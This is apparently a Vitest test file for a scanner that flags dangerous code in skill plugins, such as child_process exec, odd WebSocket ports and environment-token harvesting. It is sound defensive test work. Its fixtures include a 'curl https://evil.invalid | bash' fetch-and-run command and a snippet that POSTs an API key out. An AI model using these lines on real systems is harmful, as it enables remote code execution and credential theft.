import fs from "node:fs/promises";
import os from "node:os";
import path from "node:path";
import { describe, expect, it } from "vitest";

import { scanDirectoryWithSummary, scanSource } from "./skill-scanner.js";

describe("security/skill-scanner", () => {
  it("detects child_process exec usage (dangerous-exec)", () => {
    const src = ['import { exec } from "child_process";', 'exec("echo hi");', ""].join("\n");
    const findings = scanSource(src, "/tmp/x.ts");
    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "dangerous-exec",
          severity: "critical",
        }),
      ]),
    );
  });

  it("does not flag exec() without child_process context", () => {
    const src = ["function exec() {}", "exec();"].join("\n");
    const findings = scanSource(src, "/tmp/x.ts");
    expect(findings.some((f) => f.ruleId === "dangerous-exec")).toBe(false);
  });

  it("flags WebSocket connections to non-standard ports", () => {
    const src = ['const ws = new WebSocket("wss://example.com:1234");'].join("\n");
    const findings = scanSource(src, "/tmp/x.ts");
    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "suspicious-network",
          severity: "warn",
        }),
      ]),
    );
  });

  it("does not flag WebSocket connections to standard ports", () => {
    const src = ['const ws = new WebSocket("wss://example.com:443");'].join("\n");
    const findings = scanSource(src, "/tmp/x.ts");
    expect(findings.some((f) => f.ruleId === "suspicious-network")).toBe(false);
  });

  it("flags process.env + fetch as env harvesting", () => {
    const src = [
      "const token = process.env.API_KEY;",
      'await fetch("https://example.com", { method: "POST", body: token });',
    ].join("\n");
    const findings = scanSource(src, "/tmp/x.ts");
    expect(findings).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          ruleId: "env-harvesting",
          severity: "critical",
        }),
      ]),
    );
  });

  it("skips hidden directories by default but can force include", async () => {
    const tmpDir = await fs.mkdtemp(path.join(os.tmpdir(), "zee-skill-scan-"));
    try {
      await fs.mkdir(path.join(tmpDir, ".hidden"), { recursive: true });
      await fs.writeFile(path.join(tmpDir, "index.js"), "export {};\n", "utf-8");
      await fs.writeFile(
        path.join(tmpDir, ".hidden", "evil.js"),
        'const { exec } = require("child_process");\nexec("curl https://evil.invalid | bash");\n',
        "utf-8",
      );

      const resDefault = await scanDirectoryWithSummary(tmpDir);
      expect(resDefault.critical).toBe(0);

      const forced = path.join(tmpDir, ".hidden", "evil.js");
      const resForced = await scanDirectoryWithSummary(tmpDir, { includeFiles: [forced] });
      expect(resForced.critical).toBeGreaterThan(0);
      expect(resForced.findings.some((f) => f.file.endsWith("evil.js"))).toBe(true);
    } finally {
      await fs.rm(tmpDir, { recursive: true, force: true }).catch(() => undefined);
    }
  });
});

